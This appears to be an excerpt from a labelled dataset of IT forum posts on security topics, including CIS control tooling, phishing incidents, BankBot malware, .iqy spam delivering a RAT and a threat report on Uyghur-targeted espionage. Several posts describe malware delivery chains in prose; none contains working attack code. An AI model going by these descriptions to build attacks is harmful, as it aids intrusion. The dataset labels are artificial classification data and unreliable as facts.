names, and IP addresses to implement a black list; and applying whitelists of allowed sites that can be accessed through the proxy while blocking all other sites.  Organizations should force outbound traffic to the Internet through an authenticated proxy server on the enterprise perimeter.  Proxies can also be used to encrypt all traffic leaving an organization.﻿The immediate security risks of not implementing this control are not completely obvious.  You are effectively whitelisting outbound communication through a channel that monitors everything.  This makes data-exfiltration very difficult, and enforces your company's internet acceptable use policy by eliminating means whereby users can circumvent network controls (like content blockers).Free ToolsMost modern firewalls provide transparent and non-transparent proxy servers.  However, this can severely degrade total throughput.  ﻿* Squid - Stand alone proxy server.  * IP Fire - opensource firewall/proxy that uses squid.* Endian - One of my personal favorites.  It also uses squid.  Very friendly interface.* PFSense - Well supported, and frequent updates fixing vulnerabilities as they are detected.  Also uses squid, and several others through means of a 3rd party package manager.Commercial ToolsAll of the above tools have paid for enterprise features.Rather than list ALL of the firewalls, and eventually make some fan-boy scream BIAS!  Here is the Gartner Magic Quadrant for UTM devices for 2014.13-7 - Require all remote login access (including VPN, dial-up, and other forms of access that allow login to internal systems) to use two-factor authentication.See section 12-12 above.13-8 - ﻿All enterprise devices remotely logging into the internal network should be managed by the enterprise, with remote control of their configuration, installed software, and patch levels.The security scan comes from Network health checks and NPS as outlined in section 1-6.﻿Free Tools* Spiceworks with MaaS360 - Features are lacking for a free solution, but better than nothing.* Meraki MDM - Features are rich for a free solution, but leaves you wanting MOAR (like on prem AD integration, come on Meraki - Where you at!!!)  Works very well ith Apple iOS, and they are constantly rolling out new features for both iOS and Android.  Compatible not only with phones, but workstations as well. Spiceheads have spoken!* Miradore - Free, unlimeted devices, no time limit.Commercial Tools* Again, I will direct you to the Gartner Magic Quadrant for 2014 MDM vendors.13-9 - Periodically scan for back-channel connections to the Internet that bypass the DMZ, including unauthorized VPN connections and dual-homed hosts connected to the enterprise network and to other networks via wireless, dial-up modems, or other mechanisms.﻿I will refer you to HIDS in section 3-8.13-10 - To limit access by an insider, untrusted subcontractor/vendor, or malware spreading on an internal network, devise internal network segmentation schemes to limit traffic to only those services needed for business use across the organization's internal network.This is a best-practice, rather than a tool set.  In other words, split up your departments, and security zones into separate broadcast domains (VLANS).  A zone can be a collection of subnets/VLANs.﻿13-11 - To minimize the impact of an attacker pivoting between compromised systems, only allow DMZ systems to communicate with private network systems via application proxies or application-aware firewalls over approved channels.Publicly accessible servers should NEVER communicate with internal systems (i have actually found an acceptable exception - When that publicly accessible server is only accessed from a whitelist of trusted hosts/domains).  Web servers should never write directly to SQL servers.  They should communicate with a system that performs business layer transactions, which writes/reads to the database.  That business layer sits on this middle-man network.  Likewise, internal systems should (as much as possible) not communicate directly to public systems. I can accomplish both by creating a middle-man network (VLAN) of servers that can talk to both external and internal systems.  External systems talk to this middleman, Internal systems talk to this middleman.  Here is a quick diagram I threw together explaining how this looks:This model also meets the requirements for section 19-1.13-12 - To help identify covert channels exfiltrating data through a firewall, configure the built-in firewall session tracking mechanisms included in many commercial firewalls to identify TCP sessions that last an unusually long time for the given organization and firewall device, alerting personnel about the source and destination addresses associated with these long sessions.This is really only something you can do, if your firewall allows you to do it.13-13 - Deploy NetFlow collection and analysis to DMZ network flows to detect anomalous activity.﻿Refer to section 3-8.Maintenance, Monitoring, and Analysis of Audit Logs14-1 - Include at least two synchronized time sources (i.e., Network Time Protocol - NTP) from which all servers and network equipment retrieve time information on a regular basis so that timestamps in logs are consistent, and are set to UTC (Coordinate Universal Time).﻿Tools* GPO - I usually point my Domain Controllers at pool.ntp.org servers, and all my clients, servers, time clocks, conference phones, cameras, switches, routers, etc... to my domain controllers (Don't forget Hypervisors!)* Linux - google search for your distro!14-2 - Validate audit log settings for each hardware device and the software installed on it, ensuring that logs include a date, timestamp, source addresses, destination addresses, and various other useful elements of each packet and/or transaction. Systems should record logs in a standardized format such as syslog entries or those outlined by the Common Event Expression initiative. If systems cannot generate logs in a standardized format, log normalization tools can be deployed to convert logs into such a format.﻿Free ToolsI found found free all-in-one log collection/normalization/and analyzing tools to be severely gimped and lacking.  What works well for Windows, doesn't work will for Linux, and visa versa.  It doesn't work for me to have 2 systems in place, therefore, I cannot recommend any good free tools for this.Commercial Tools* Tenable Log Correlation Engine - A leader in Security, Tenable makes a great tool that collect, normalizes, analyzes, and alerts for almost any log out there.* EventLog Analyzer - Ties in with ManageEngines other wide array of IT tools.  They do offer a free version for upto 5 devices* AlienVault USM - With everything else that it does, it also has log correlation!14-3 - Ensure that all systems that store logs have adequate storage space for the logs generated on a regular basis, so that log files will not fill up between log rotation intervals.  The logs must be archived and digitally signed on a periodic basis.More common sense than anything.  You wanna log all the things?  You gonna need space!﻿14-4 - Develop a log retention policy to make sure that the logs are kept for a sufficient period of time.  Organizations are often compromised for several months without detection.  The logs must be kept for a longer period of time than it takes an organization to detect an attack so they can accurately determine what occurred.﻿The above logging tools all come with log rotation and retention settings.  14-5 - Have security personnel and/or system administrators run biweekly reports that identify anomalies in logs.Don't expect your SIEM/Log correlation system to find everything.  Manual work is needed to.﻿14-6 - Configure network boundary devices, including firewalls, network-based IPS, and inbound and outbound proxies, to verbosely log all traffic (both allowed and blocked) arriving at the device.This is more of a best practice, than a tool.14-7 - For all servers, ensure that logs are written to write-only devices or to dedicated logging servers running on separate machines from the hosts generating the event logs, lowering the chance that an attacker can manipulate logs stored locally on compromised machines.Free Tools* Microsoft Event Collector - Forward all or certain events to a collector.* nxlog - Compatible with Windows and Linux.﻿﻿Commercial ToolsAll the tools in the above section within this control perform this function.14-8 - Deploy a SIEM (Security Incident and Event Management) or log analytic tools for log aggregation and consolidation from multiple machines and for log correlation and analysis.  Using the SIEM tool, system administrators and security personnel should devise profiles of common events from given systems so that they can tune detection to focus on unusual activity, avoid false positives, more rapidly identify anomalies, and prevent overwhelming analysts with insignificant alerts.Ah, finally. SEIM.  The solution to all our problems right?  right?  right?  Free Tools* AlienVault OSSIM - yes, it does that too.* LogStormCommercial ToolsOnce again, I will point you to the Gartner Quadrant for SEIM 2014.14-9 - Monitor for service creation events and enable process tracking logs. On Windows systems, many attackers use PsExec functionality to spread from system to system.  I will direct you to HIDS in section 3-8.14-10 - Ensure that the log collection system does not lose events during peak activity, and that the system detects and alerts if event loss occurs (such as when volume exceeds the capacity of a log collection system). This includes ensuring that the log collection system can accommodate intermittent or restricted-bandwidth connectivity through the use of handshaking / flow control.﻿There are really no tools I can recommend for this.  Check with the vendor before purchasing.Controlled Access Based on the Need to Know15-1 - Locate any sensitive information on separated VLANS with firewall filtering.  All communication of sensitive information over less-trusted networks should be encrypted.Free ToolsKnow of any?  Commercial Tools* Varonis - Shows where in file systems sensitive data resides, who has access to it, who should and shouldn't have access to it, who uses it, who owns it, and where is it over exposed.* Netwrix Auditor - Change auditing and reporting for IT systems﻿.* Compare the two - Don't you just love it when both vendors do a point counterpoint on each other?  Everyone benefits!15-2 - Enforce detailed audit logging for access to nonpublic data and special authentication for sensitive data.﻿See section 14 for logging tools15-3 - Segment the network based on the trust levels of the information stored on the servers.  Whenever information flows over a network with a lower trust level, the information should be encrypted.* Domain Isolation - While not a single tool, it is a common best practice to separate your network into zones and define higher security standards for zones that contain sensitive data using IPsec. Inrto to Domain Isolation.15-4 - Use host-based data loss prevention (DLP) to enforce ACLs even when data is copied off a server.  In most organizations, access to the data is controlled by ACLs that are implemented on the server.﻿Free Tools* Windows Server 2012 ﻿- Data Classification Infrastructure (DCI) allows you to classify data if it contains content you specify as a certain classification (SSN = high), then applies rules to certain levels of classification (do not copy/print, encrypt, etc..).Commercial Tools* Digital Guardian - Classify files as they are created and create rules on what to do with certain classifications.",12
2090692,"BankBot mobile trojan targets Wells Fargo, Chase, and Citibank customers","The Avast Threat Intelligence team has worked together with researchers at ESET and SfyLabs to get on the case of BankBot -- mobile banking malware that has snuck its way on to the Google Play store on several occasions so far this year.This malware has been hiding in apps that appear to be legitimate: flashlight apps, Solitaire games, and a cleaning app. Recently, Google has put in place protective measures to prevent these types of apps from becoming available, but the developers have gotten smart to this and are using specific techniques to circumvent this, allowing 1000's of users to be exposed.The depth to which these malicious apps will go to compromise a device is impressive. From the blog:""As soon as these apps are downloaded, the malware activates. It checks what applications are installed on the infected device against a hard coded, pre-computed SHA1 list of 160 mobile apps. The package names are hashed, and therefore we’ve only been able to identify 132 of them. This list includes apps from Wells Fargo and Chase in the U.S., Credit Agricole in France, Santander in Spain, Commerzbank in Germany and many others from around the world. You can find a full list of targeted apps at the end of this post.If the malware is able to identify one or more apps from the SHA1 list installed on the phone, it initiates a ‘service’ - an expression used for an Android application component that can perform long-running operations in the background. The service includes a dropper functionality that allows it to download another application from a webserver in order to install it on the device.""After all of this, the app will work to trick the user into giving it admin rights, and 2 hours after that, it begins to download its payload, the BankBot APK.The moral of the story is that Android users -- despite Google's diligence -- are at risk of downloading malicious apps. Keep your phones safe, folks :)Lots more technical detail from the tewam in the full blog entry, posted here.",11

1997978,What is This Phishing Scam Supposed to Catch?,"Hi, all;Some of my users are getting emails from ""The Azure Active Directory Team"" asking them to verify their Office 365 account information.  They're obviously a scam (they're sent from the same email addresses as some wire transfer scams we received a couple of months ago, and the addresses aren't even masked), but there's a worrisome component here.  Web searches tell me that this type of scam usually involves clicking on the ""verification"" link, which takes the user to a fake MS website, where they log in and allow the scammer to steal their credentials.I've had three of my users click on these links since last night (education is still an ongoing process--this scam is new to them), and so far they've all told me the same thing--nothing happened.I've quarantined their PCs and will scour all of them, and I'm watching our servers like a hawk, but I'm concerned by the lack of a launching webpage.  What if the link opened access to some sort of malware?  I haven't seen this link in action in person, so I can't even make an educated guess.  Do I presume the links just didn't work?  That seems like a bad idea to me; so do I nuke the PCs and move on?  Is there an interim step that will give me results I can trust?  To my mind literally anything is possible, so I have little idea of where to begin.Things I should also mention:  Win10, peer-to-peer, no domain (ugh...), but most systems mapped to a drive on the file server (WinSrv2012R2), and users have local admin rights (ugh again... not my idea).  Some malware security (Avast Business), but we're small and don't have much budget for it.Has anyone seen anything like this before?  Past experience would seem to be my best consultant before moving forward.  If anyone has thoughts, I'm all ears.Thanks...",0

1233505,AVG Cloudcare Alternatives?,"Hi All,This morning was the final straw with AVG Cloudcare. When I first looked at the product it looked like a great system - We could provide anti-virus, backup and remote support all from a central console. However over time Cloudcare has proven to have too many bugs - leading me to spend more trying to fix theses issues that are not chargeable - so we end up losing out on money, this then makes us look like a sloppy service provider. After hours last night and this morning it is time for us to change provider, being unable to remotely connect to a customer when your on the phone or not being able to tell them why their backup isn't is running is unacceptable. If AVG pulled their finger out and fixed some of theses basic issues they would have a very good platform.

298045,"Schneier: possible backdoor in IPMI, iDRAC, IMM@, iLO","I did not know this.Schneier on Security: The Eavesdropping System in Your ComputerDan Farmer has an interesting paper (long version here; short version here) discussing the Baseboard Management Controller on your computer's motherboard:    The BMC is an embedded computer found on most server motherboards made in the last 10 or 15 years. Often running Linux, the BMC's CPU, memory, storage, and network run independently. It runs Intel's IPMI out-of-band systems management protocol alongside network services (web, telnet, VNC, SMTP, etc.) to help manage, debug, monitor, reboot, and roll out servers, virtual systems, and supercomputers. Vendors frequently add features and rebrand OEM'd BMCs: Dell has iDRAC, Hewlett Packard iLO, IBM calls theirs IMM2, etc. It is popular because it helps raise efficiency and lower costs associated with availability, personnel, scaling, power, cooling, and more.    To do its magic, the BMC has near complete control over the server's hardware: the IPMI specification says that it can have ""full access to system memory and I/O space."" Designed to operate when the bits hit the fan, it continues to run even if the server is powered down. Activity on the BMC is essentially invisible unless you have a good hardware hacker on your side or have cracked root on the embedded operating system.What's the problem?There is a constant tradeoff between convenience and security. ",11

444236,Symantec PGP WDE for OS X 10.9/Win7 Bootcamp,"If you deciphered the title, then I assume you have some idea of the context of this question. For those who didn't, here's some background:<background>We use Symantec Encryption Desktop to encrypt our laptops. For some reason, some of our laptops are Windows-based and work well with PGP, some are solely OS X and work well just being FileVault-ed. Then there are the trouble systems that run both OS X and Windows 7 in a bootcamp setup. The question is about that last group of laptops.</background>So, here's the deal. I am following a guide that says to install PGP on the Windows side first, enroll, but do not encrypt the drive. Then, boot into the OS X side, install PGP, enroll, and encrypt from there. This process has worked on several Mac laptops in my organization so far, but a doctor brought in a new MacBook Air with OS X 10.9, and the system refuses to allow me to enroll on the Windows side. It acts as if it will work, but on reboot will not load the bootguard screen. It instead takes me right into Windows to enroll again.It is my theory that this explains why the OS X side of things fails as well. At first, I went through this process without confirming that things were working on the Windows side (again, this has worked several times before). When I got the the OS X side of things, it failed.I have called Symantec and talked with their very foreign tech support who logged my request (incorrectly, by the way), sent an email to me (which is how I know the request was logged incorrectly), and said that someone would be able to get back with me tomorrow. So, I am turning to the Community for assistance.Does anyone out there have any experience with this issue? Alternatively, does anyone know of a way to encrypt OS X 10.9 and Windows 7 Pro other than PGP? I have looked into TrueCrypt and GnuPG without success. Bitlocker isn't an option due to the Pro nature of Windows 7 and my boss isn't too keen on EFS.",0

1906687,Email Malware that responds to questions,"I'm coming to see if others have encountered this before, and can give any insight into what I'm really dealing with.Yesterday a user's mail account sent out 2 emails. Between the two of the emails we believe it encompassed almost all if not all of her mail contacts.  In those emails was a link to a 'drop box' file. The link took recipients to a page where they saw a 'drop box' page with prompts to login to various email providers.  As best we can tell it was just a password capture, that when someone supplied an email address and password it took them to a file hosted publicly on google docs.  The file was about wealth management. Curiously if a recipient responded to the email asking questions it would generate an automatic response 'confirming the legitimacy of the email'.Taking the user's computer offline seemed to stop the automatic responses, as well as disabling their account on Office365.What I'm trying to do at this point is determine what caused the problem. I believe it was 'client computer based', not someone outside getting their credentials and doing it externally.  In asking the user what might have happened prior to this to cause the infection, they mentioned a suspicious email they had received the day before that they had then installed 'google drive' as part of trying to get to the file. Unfortunately the user 'uninstalled the program' while I had stepped away from the computer. I've been unable to get the computer (Surface Pro 3) to boot from a USB rescue CD to do an offline scan. I've tried Kaspersky, Eset (computer won't even recognize these to boot) and BitDefender.  BitDefenender actually booted, but hung at a black screen with a white cursor. Kaspersky Endpoint Security 10 MR3 was installed on the computer. I believe the 'email' piece of the client was disabled, probably due to previous performance impacts. Running a Full HDD, Memory, and Boot Sector scan while logged in as a different user reported no malware.I can provide the links used, but not wanting to invite others into my world of misery.So Assistance requests are this:Anyone seen a malware like I've described?Thoughts on the actual cleanness of the computer at this point?EDIT: I will add on further investigation, I got the 'problem' email into a VM and went through the steps it would have wanted.  Windows 10 tried to throw up all kinds of warnings about the link from the original email being suspicious.  I 'think' it may have downloaded a legit version of google drive. The cert look mostly legit, if not older. There was a prompt along the way that I think was a password capture piece as well.  I'm still not seeing how it managed to start sending the emails. There was a long 'pause while it logged on' which may have been installing something. Trying to do a Recovery CD boot without success for the VM.  at the moment",11
400273,A Serious Legal Liability: Bad or No Security Awareness Training,"Please read this article and then forward it to the head of your legal department or the person in your organization who is responsible for compliance.Recently, the Department of Health and Human Services reported that bad or no security awareness training is a main cause for compliance failures. This is true for not only health care, but all kinds of organizations in industries like banking, finance, insurance, manufacturing, and surprisingly, high-tech. It does not stop with mere compliance failures causing regulatory fines. Trend Micro reported that 91% of successful data breaches started with a spear-phishing attack.The problem is that to be ""letter of the law"" compliant, you only need to herd your users once a year into the break room, feed them coffee and donuts, and give them a ""death by PowerPoint"" awareness update. However, ineffective security awareness training could turn out to be a serious legal liability.Why? Cybercrime goes after the low-hanging fruit: your users. Why spend time exploiting complicated software vulnerabilities when you can easily social engineer an end-user to click on a link?So your end-user did not get effective awareness training and falls for the hacker trick. Their workstation gets infected with a keylogger, the hacker now knows their login and password, and with that penetrates your network. Simply put: if it's the Eastern European cyber-mafia, their focus is to transfer out money from your operating account over a weekend. (See story below). If it's the Chinese, they will steal your intellectual property. If it's independent hackers, your customer database and credit card transactions are exfiltrated and sold on dark web criminal sites.In all three cases you run the risk of a lawsuit:1) You might sue the bank for negligence, and they might sue you back. Massive legal fees are inevitable. If it is found out the attackers came in by social engineering a user, your case is significantly weakened. Go to Brian Krebs' site and search for Patco Construction, a nightmare scenario.  Here it is:www.krebsonsecurity.com2) If the Chinese steal your intellectual property and you are exposed to a shareholder lawsuit, there will be a lengthy and costly discovery period. If it is found out the attackers came in by social engineering a user, your case is significantly weakened.3) If hackers get into your network, and an investigative journalist like Brian Krebs discovers a website that has all your customer records and credit card transactions, a class action lawsuit is not far away. (This is the legal profession's biggest growth industry). If it is found out the attackers came in by social engineering a user, your case is significantly weakened.See the trend here? Not scaling your training to a level that effectively mitigates the risk you are exposed to is a severe legal liability.We have a new whitepaper called ""Legal Compliance Through Security Awareness Training"" written by Michael R. Overly, Esq., CISA, CISSP, CIPP, ISSMP, CRISC. He explains the concept of acting “Reasonably” or taking “Appropriate” or “Necessary” measures. Reading this whitepaper will help you to prevent violating compliance laws or regulations.Do These Two Things:ONE: Did you know that legally you are supposed to ""scale security measures to reflect the threat""? In the whitepaper are some examples of the Massachusetts Data Security Law and HIPAA to explain what is required. I strongly recommend you download this whitepaper and get up-to-date about the legal repercussions of not providing effective security awareness training:http://info.knowbe4.com/whitepaper-overly-kb4-13-08-27TWO: Have you ever wondered how effective your current Security Awareness Training program really is, and if you are at risk in case of legal action?  We offer a FREE test that gives you a real quantifiable number as to the percentage of your users that would click through, and fail, a simple Phishing email.  Do our free Phishing Security Test.

Copy the.xml configurationfile (cfg.xml) to the directory where the install file is located. Upon execution, the installer will automaticallyadopt the configuration from the.xml configuration file. If the.xml configuration file has a different name or islocated somewhere else, the parameter ADMINCFG =”path_to_xml_file” can be used (e.g., ess_nt32_enu.msiADMINCFG =”\\server\xml\settings.xml” to apply the configuration stored on a network drive).""If anyone can assist I do appreciate it.

2140540,Excel used to download malware in active .iqy file spam campaigns,"Head's up, all — new spam campaigns have been spotted using an interesting new malware delivery tactic. Instead of using Word docs or other commonly abused attachment types, these new emails are using .iqy file attachments to infect victims with a remote access trojan by exploiting Excel. We're providing full details on how it works over at the Barkly blog, but here are some of the key details:What are .iqy files? Excel Web Query (.iqy) files are used to download data from the Internet directly into Excel. They’re extremely simple (just a few lines of text), but also powerful. The .iqy files used in these campaigns download a PowerShell script, which is launched via Excel and kicks off a chain of malicious downloads that ultimately result in installing a remote access trojan.What makes .iqy files dangerous? For starters, they've been described as ""basically like having a web browser built into Excel."" Luckily, they trigger warning prompts (as long as Office default settings are in place), but if users choose to ignore those warnings, .iqy files can be used to download any data from the Internet. In addition, because .iqy files are simple, legitimate text files, AVs aren't equipped to handle them. Case in point: The .iqy file seen in the most recent spam campaign had zero detections on VirusTotal (two days later, it's only up to five). What do the spam emails look like? Currently, they're disguised as “Unpaid invoice” alerts, which appear as though they're being sent from someone inside the victim’s organization. The body is blank, so hopefully any user who receives one of these is going to think it's suspicious. But while this specific spam campaign is rather basic, experts are much more worried about the .iqy file method getting used in more sophisticated attacks. What is the payload? Currently, it's a remote access trojan (RAT) called FlawedAmmyy, which has an interesting backstory of its own. Built on the leaked source code for the remote desktop software Ammyy Admin, it effectively gives attackers complete access over infected machines.How does Barkly protect me from these attacks? Unlike antivirus solutions, Barkly isn't limited by signature matching or static file analysis. In addition to analyzing files, Barkly also blocks suspicious system activity and process patterns. In this case, it sees Excel attempting to launch cmd.exe in order to launch powershell.exe, and it blocks that behavior before it can result in payloads being downloaded from the Internet. What else can I do now? Admins are advised to adjust firewall and email filtering to block .iqy files. In addition, unless .iqy files are actively utilized in your organization, it may be wise to take things a step further by instructing Windows to always open .iqy files in Notepad (similar to what some experts advise doing with .js files).  Here's a diagram that shows how .iqy file abuse works (and how Barkly prevents it): While the dangers of .iqy files aren't entirely undocumented (security researcher Casey Smith pointed out their potential for phishing in 2015), the fact that they are now being utilized in multiple Necurs campaigns means the genie is completely out of the bottle and more widespread abuse is likely on the way. As researcher Kevin Beaumont points out, it's also scary to think about this technique being utilized in a more sophisticated way. He may be referring to smarter spam campaigns, but it also doesn't take an abundance of imagination to think of more damaging and evasive possibilities on the payload delivery side of things, too (Invoke-ReflectivePEInjection, anyone?). Unfortunately, these immediate campaigns feel like the tip of the iceberg, so best to prepare by disabling/restricting this file type now. If you're interested in learning more about .iqy files, this is a good post to start with: https://www.vertex42.com/News/excel-web-query.htmlYou can find more details about these new attack campaigns on the Barkly blog: https://blog.barkly.com/iqy-file-attack-malware-flawedammyy",11
1384566,Ways to help curb ransonware,"Thought of the following, but not entirely sure of how this malware and such exactly work outside of what I've read in various articles.  Can anyone verify if these might help?1. Block all access to the dark web through a firewall policy.﻿As I understand it, ransonware has to communicate with its servers that are located somewhere on the dark web.  Disabling access would deny the software from relaying the  information necessary to start the encryption process.﻿2. Set backups to first open a network connection with a different user account, perform the backup, and then close the connection.﻿By this I mean that you can have a separate user account that has exclusive access to a network share, whereas all admin accounts are denied access.  It will open a connection to the share, run the backup, and then close the connection.  The idea is that the connection will close before the ransomware has a chance to access it.﻿3. Use a cloud backup.﻿I've noticed that Backblaze, for example, doesn't open an explorer shell which would allow encryption to take place.  If you detect the infection in time, you may be able to safely restore your files with a minimum amount of downtime.4. Use a cloud-based email service﻿Gmail, for example, will not allow EXE files to be sent over email or in a zip file.",0

1521469,"Best Security ""Suggestions""","Over the past couple of weeks I noticed a number of threads concerning different aspects of information security. I thought this would be a good time to sort of gather up the thinking behind what makes for a ""secure"" IT environment as well as maybe pass along the decades of experience that is floating around in this group.I'm not going to get into ISO frameworks, instead I'm talking about practical items that anyone can look at and implement.So to get things started, here are some things I've learned over the years. I'll break this up into sections to make it a little more digestible.PoliciesHaving user policies in place is important. Things like acceptable usage, ownership of equipment and information, expectation (or lack there of) of privacy, and handling of customer information should at minimum all be spelled out.Having policies alone isn't enough. In order for any policy to be effective, it has to become part of how business is done. Make sure your operating processes and procedures work within your security policies.User accounts and passwords:If you don't have a formal process for creating user accounts, create one. Hiring managers should know, and specify, who has access to what systems. Same holds true for terminations or separations. Have a process that specifies how things like employee accounts and information is handled when the employee leaves the company.Never create an account without an expiration date of no longer than one year from creation. This forces you (and company managers) to examine what accounts exist and whether they're still needed. Old, dormant accounts are a huge security hole.Worry less about password ""complexity"" and focus more on password length. Easy to remember passwords consisting of three or four words with spaces in between are MUCH harder to break than an eight character L33t$p3@k password. They're less likely to be written down on a post it note as well.If practical, go to two factor authentication. Not all options here are equally easy or secure (biometrics = easy but not that great for security, RSA tokens = kind of a PIA but very secure) but really any two factor is better than any single factor authentication method.System AccessMost basic rule in the book. NEVER, EVER connect a system to the Internet unless that systems JOB is to communicate with the Internet. If you have systems that people on the road need to access, that's what VPNs were invented for.Network segmentation. It's a thing. Learn it, use it. Not all systems need to be accessible to everyone. Firewalls are cheap and pretty much all managed switches support VLAN tagging so no excuses.If possible, centralize access management. Even a basic RADUIS setup can both reduce the amount of labor required to manage user access and cut the odds of an account slipping through the cracks.User EducationEducate your employees. Period. Ignorance is your greatest enemy.Take the approach of giving your employees a level of street smarts. Most of the attacks they'll see are nothing more than a con. Teach them to recognize a con when they see it and you're most of the way there.ManagementDump anything resembling technical jargon when discussing security with business leadership. ""Information Security"" is just plain, old fashioned security. We're talking about who can get into what and under what circumstances. A thief who used e-mail to run a con to get access to the company bank account is no different than one who broke into the office to raid the petty cash box. The results are the same. So are the remedies to keep that from happening.Never forget that security risks are ultimately business risks. Each has an odds of occurring and a cost associated with it happening. Be prepared to discuss both. Otherwise don't expect business leaders to be able to make an informed decision.These are just some of the items that came to me late on a slow Friday afternoon. What sort of suggestions would you make to someone just getting started?",11

1537772,Let's Encrypt certificates can be used for more than HTTPS,"Last month, the free certificate authority Let's Encrypt issued its millionth certificate after beginning operations in September 2015. But while the goals of Let's Encrypt are to provide freely available SSL (Secure Socket Layer) and TLS ﻿(Transport Layer Security) to help encrypt online data and information, Chris Siebenmann, a developer at the University of Toronto, says that ""Let's Encrypt certificates can be used for pretty much any TLS,"" which range from IMAP servers to MTAs for SMTP. ""The LE documentation won't tell you how to set this up, the official client doesn't have any support for it as far as I know, and the LE 'prove that you control this host' challenge process doesn't have any provisions for doing it through IMAP or SMTP servers, but it can certainly be done,"" Siebenmann writes. ""And if you already have a certificate issued to a host for HTTPS, you can also use that certificate for your IMAP server, your SMTP server, and so on.﻿"" By installing SSL and TLS certicates, you guarantee yourself an additional layer of security, which will help maintain the privacy of communications within your organization. And in today's world, the more secure something is, the better off you'll be. Siebenmman provides detailed instructions and links to other guides on his blog (linked above), which include the correct order for installing certificates and how to make sense of certificate chains. ",0

2090812,CoinHive connections and firewalls,"Hello, I am concerned. I have a pretty standard home network, minus the fact that I run a home lab game server which isn’t currently running, as it’s under development. It’s an ArmA 3 server. I bring this up because I fear it may have brought some bad things into my network during the week it was “on the internet”. I ran it as a public server for about a week to monitor connections to the server and audit performance and stress under load before shutting it down when I deployed overseas. (Military)I’m now back, and looking through my logs on my PC (gaming desktop) I see there are a ton of logs in malware bytes about websites being blocked. Literally 100’s of logs from right before I left and shut down my network. Here are the logs of primary concern: Ws028.coin-hive.com ( this has about 50-60 log entries, showing that coin-hive is trying to make outbound connections on many random ports (52241,59060, many others) with many different IP address)Overely.com (also using random ports and random IP address, also outbound connections) Reading about coin-hive, I don't know that these are neccesarily ""malicious"", although if I'm not mistaken, Coin-hive is something that uses your processor to mine coin. I wouldn't like to participate in this, and I need to figure out how to stop these programs from accessing/exploiting my machines. With this, I have to ask: What can I do? My initial thought would be to (on the server) whitelist only neccesary ports/programs and blacklist everything else, which seems easy enough. However, these logs were registered on my PC, and I don't know what comes with blacklisting everything on a PC. Will it cause programs to stop functioning? Will I have to block a range of ports, or make specific rules to stop these potentially malicious things? Just an interesting note: when I run a tracert on these IP addresses, the end points seem to be all around the world (germany, south africa). I don't know if this is entirely relevent, as I use a VPN (although I'm connecting to a local server), but these outbound destinations seem weird. If you have any explainations as to WHAT this is and how to prevent it and implement better practices, please let me know.",0

923700,Network Share Encryption,"Hello all, we are looking for a something to use for network share encryption.  There is a catch though:To give you the full background so this will make sense:We will be getting data from our client(s) in an encrypted format, we have the keys to decrypt that data using a 3rd party application, in this case Kleopatra.  Once it is received on our side, it will be extracted in to the specified share that we want to have encrypted so our users can work with it.  Ultimately what will happen is our users will process the various data and then need to send it back to the client.  When we send it back to the client we need a way to drop the encryption from whatever internal application we end up using, have the file be compressed/encrypted with the client keys using Kleopatra and then deliver it to them.What we have run into is pretty much all the encryption applications we have tested (i.e. Symantec and Sophos) will encrypt a share fine and work as expected internal, but when we try to get the data back to our client there doesn't seem to be a way to briefly decrypt the file from the network share application.  I understand why they work in the manor they do, what i am hoping is someone has similar experiences and may have a solution?  Right now we have been relying on the user to manually encrypt/decrypt the data they are working with as they use it.  The problem with that is it requires extra steps, and well we all know how users can be about a couple of extra clicks.Any input would be appreciated.Thanks ",0
1456746,How to overcome antivirus false positive error,"Hi there,We develop software which will upload the files to a website. We are facing the false positive error from different antivirus vendors.  We have update file, downloader exe(which download the files from web) and full setup ( which includes update files). We will release the update as soon as there is any change in the website schema to which we are uploading files.When the customers run the update file or install a new setup they will get warning from antivirus vendors like Symantec, Norton that very less people have used this setup (less than 5) and last week Norton and Symantec deleted the our setup by giving warning “WS.Reputation.1” . Some antivirus vendors like 360 Total security give dll error (the file is trying to modify the system dll).I used to scan in virus total before releasing but there I don’t get any virus warnings there. I know I can white list my files before uploading to my server, but have a problem with that. As I said our software is used to upload files to website, as soon as there is any change in that website I have to release the new update.  But white listing will take certain time to upload the latest definitions to antivirus vendor’s servers and customers have to download that before running my setup in order to get rid of false positive. So I think white listing will not completely solve my problem. What things I can do to overcome this problem?Is there any way to keep history of my exe version with antivirus vendors so that they can trust my file?Also how big software companies overcome antivirus false positive problem ?",0

1723360,Should I allow HTTPS decryption on my UTM?,"Hi all,We are investing in a UTM for our business. One of the sticking points for a colleague of mine is whether or not we should allow HTTPS inspection where the UTM acts as a man in the middle effectively and de-crypts the packets (as far as my understanding goes) acting as the client and the server. My colleague seems to think that this ""breaks"" SSL and that anyone could hack into our UTM and then see the traffic... I am not so convinced that someone could just hack in and look at our SSL traffic. We're going with a WatchGuard M200 UTM. I would setup rules to not inspect banking traffic but so many sites now us HTTPS that it seems fair to inspect this traffic too... My questions are, is he right in his assessment and how likely is it that someone can hack into the box and see our decrypted SSL traffic?

251121,Best methods for locating a SpamBot?,"I have a spam bot some where on my network and it's driving me crazy. A couple of my users began complaining about a few spam messages and I had gotten a few so I started to look into it. I tried to look up one of the email addresses on Symantec Message Labs but it came back with no results which leads me to believe the emails are coming from somewhere on the local network. The emails are always with the subject the Who's Who Network and have random user and domain combinations. I've started manually checking every computer is up to date on virus definitions and running a scan with Symantec and Malwarebytes which is a pain because I have over 90 workstations. The emails have picked up drastically, just today I've gotten about 45. Have any of you had to deal with a similar issue? If so could you give me some tips of how to pinpoint which computer is infected so I can make these stop. Thanks for all your help.",0

1903693,Flying Dragon Eye: Uyghur Themed Threat Activity,"By: Arbor’s Security Engineering & Response Team (ASERT)This paper documents attempted exploitation activity aimed at Uyghur interests outside of China. Exploitation is being attempted via the usual tactic of spear phishing containing malicious attachments to targets. The exploit code attached used for dropping the malware is older – CVE-2012-0158 – and from our vantage point, we have no indication of successful or failed exploitation. Nonetheless, we can obtain targeting information and insight into tactics from the spearphish messages used by the threat actors. Successful exploitation typically results in malware calling back to one or more Uyghur themed domain names. The malware payloads observed to be associated with the Uyghur themed C2 domains so far consist of PlugX, Gh0st RAT, and Saker/Xbox, although there may be others that are yet to be discovered.DOWNLOAD THE FULL REPORT (PDF) >> DOWNLOAD INDICATORS OF COMPROMISE (IOCs) HERE >>It is possible that additional targeting well beyond CVE-2012-0158 is at play, although in this case it appears that threat actors still thought they could obtain benefit from using a four-year-old vulnerability that has been widely associated with numerous cyber-espionage operations over the years. This may be due to the weakness of defensive posture among those targeted and an attempt at higher return on investment by using exploit code that might still be adequate considering the targets. Pivots on threat infrastructure suggest that the same or related threat actors have direct or indirect access to other types of exploit code such as the “Four Element Sword” builder and the numerous types of malware delivered 